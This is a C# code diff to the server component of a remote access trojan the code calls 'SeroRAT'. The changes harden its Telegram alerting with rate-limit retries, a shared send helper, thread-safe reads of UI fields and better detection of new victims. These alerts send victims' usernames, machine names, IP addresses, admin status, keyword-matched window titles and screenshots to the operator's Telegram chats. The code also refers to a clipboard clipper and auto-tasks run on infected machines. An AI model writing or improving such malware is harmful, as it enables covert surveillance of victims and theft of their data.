@@ -699,14 +699,16 @@ public partial class ServerWindow : ThemedWindow
 
             var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
             var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz).ToString("yyyy-MM-dd HH:mm") + " (Paris)";
+            var winTitle = data.Title?.Length > 200 ? data.Title[..200] + "…" : (data.Title ?? "");
             var caption =
                 $"\U0001f6a8 Window Notify — SeroRAT\n\n" +
                 $"Keyword: {data.Keyword}\n" +
-                $"Window: {data.Title}\n" +
+                $"Window: {winTitle}\n" +
                 $"ID: {client?.Id ?? "?"}\n" +
                 $"User: {client?.Username ?? "?"}@{client?.MachineName ?? "?"}\n" +
                 $"IP: {client?.IP ?? "?"}\n" +
                 $"Time: {paris}";
+            if (caption.Length > 1024) caption = caption[..1021] + "…";
 
             var targets = new List<string> { chatId1 };
             if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);
@@ -724,12 +726,7 @@ public partial class ServerWindow : ThemedWindow
                     if (jpegBytes != null && jpegBytes.Length > 0)
                         await TelegramSendPhotoAsync(_telegramHttp, token, id, jpegBytes, caption);
                     else
-                    {
-                        var url = $"https://api.telegram.org/bot{token}/sendMessage" +
-                                  $"?chat_id={Uri.EscapeDataString(id)}" +
-                                  $"&text={Uri.EscapeDataString(caption)}";
-                        await _telegramHttp.GetAsync(url);
-                    }
+                        await TelegramSendTextAsync(_telegramHttp, token, id, caption);
                 }
                 catch { }
             }
@@ -744,7 +741,17 @@ public partial class ServerWindow : ThemedWindow
         form.Add(new System.Net.Http.StringContent(chatId), "chat_id");
         form.Add(new System.Net.Http.ByteArrayContent(jpegBytes) { Headers = { ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/jpeg") } }, "photo", "screenshot.jpg");
         form.Add(new System.Net.Http.StringContent(caption), "caption");
-        await http.PostAsync(url, form);
+        var resp = await http.PostAsync(url, form);
+        if ((int)resp.StatusCode == 429)
+        {
+            int wait = 30;
+            if (resp.Headers.TryGetValues("Retry-After", out var vals)
+                && int.TryParse(vals.FirstOrDefault(), out int ra))
+                wait = Math.Max(ra, 5);
+            await Task.Delay(wait * 1_000);
+            throw new HttpRequestException($"Telegram 429 — waited {wait}s");
+        }
+        resp.EnsureSuccessStatusCode();
     }
 
     private void SetWinNotifyKeywordsLocked(bool locked)
@@ -833,17 +840,25 @@ public partial class ServerWindow : ThemedWindow
     // ── Server-side Telegram notification (global counter) ──────────────────────
     // Fires when a brand-new HWID connects — uses the server's DataStore count
     // so the number is truly global across all victims, not per-machine.
-    private async Task ServerTelegramNotifyAsync(Data.ConnectedClient c)
+    private async Task ServerTelegramNotifyAsync(Data.ConnectedClient c, int clientCount)
     {
         try
         {
-            var token   = BldTelegramToken.Text.Trim();
-            var chatId1 = BldTelegramChatId1.Text.Trim();
-            var chatId2 = BldTelegramChatId2.Text.Trim();
+            // UI controls must be read on the Dispatcher thread — this method is called from Task.Run.
+            string token, chatId1, chatId2;
+            try
+            {
+                (token, chatId1, chatId2) = await Dispatcher.InvokeAsync(() => (
+                    BldTelegramToken.Text.Trim(),
+                    BldTelegramChatId1.Text.Trim(),
+                    BldTelegramChatId2.Text.Trim()
+                ));
+            }
+            catch { return; }
             if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;
 
-            // Global count = total unique HWIDs the server has ever seen
-            int count   = _store.AllClients.Count;
+            // clientCount is snapshotted at connect time — before any concurrent connects can inflate it.
+            int count   = clientCount;
             var admin   = c.IsAdmin ? "Yes" : "No";
             var country = string.IsNullOrEmpty(c.Country) ? "N/A" : c.Country;
             var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
@@ -868,17 +883,36 @@ public partial class ServerWindow : ThemedWindow
 
             foreach (var id in targets)
             {
-                try
+                for (int attempt = 0; attempt < 3; attempt++)
                 {
-                    var url = $"https://api.telegram.org/bot{token}/sendMessage" +
-                              $"?chat_id={Uri.EscapeDataString(id)}" +
-                              $"&text={Uri.EscapeDataString(msg)}";
-                    await _telegramHttp.GetAsync(url);
+                    try
+                    {
+                        if (attempt > 0) await Task.Delay(2000);
+                        await TelegramSendTextAsync(_telegramHttp, token, id, msg);
+                        break;
+                    }
+                    catch { }
                 }
-                catch { }
             }
         }
         catch { }
+    }
+
+    private static async Task TelegramSendTextAsync(System.Net.Http.HttpClient http, string token, string chatId, string text)
+    {
+        var url = $"https://api.telegram.org/bot{token}/sendMessage" +
+                  $"?chat_id={Uri.EscapeDataString(chatId)}" +
+                  $"&text={Uri.EscapeDataString(text)}";
+        var resp = await http.GetAsync(url);
+        if ((int)resp.StatusCode == 429)
+        {
+            int wait = 30;
+            if (resp.Headers.TryGetValues("Retry-After", out var vals)
+                && int.TryParse(vals.FirstOrDefault(), out int ra))
+                wait = Math.Max(ra, 5);
+            await Task.Delay(wait * 1_000);
+            throw new HttpRequestException($"Telegram 429 — waited {wait}s");
+        }
     }
 
     private static string TgOrdinal(int n)
@@ -1008,7 +1042,7 @@ public partial class ServerWindow : ThemedWindow
                         {
 
                         bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
-                                         || rec.ActivityLog.Count <= 1;
+                                         || (DateTime.UtcNow - rec.FirstSeen).TotalSeconds < 30;
                         NotificationService.NotifyConnected(c.Id, isNewHwid);
 
                         var atSnapshot = _autoTasksSnap;
@@ -1016,7 +1050,7 @@ public partial class ServerWindow : ThemedWindow
                             await ExecuteAutoTasksForClient(c, atSnapshot.ToList());
 
                         if (isNewHwid && _telegramEnabled)
-                            _ = ServerTelegramNotifyAsync(c);
+                            _ = ServerTelegramNotifyAsync(c, _store.AllClients.Count);
 
                         var cachedClipperJson = _clipperConfigJsonCache;
                         if (_clipperRunning && _server != null && cachedClipperJson != null)
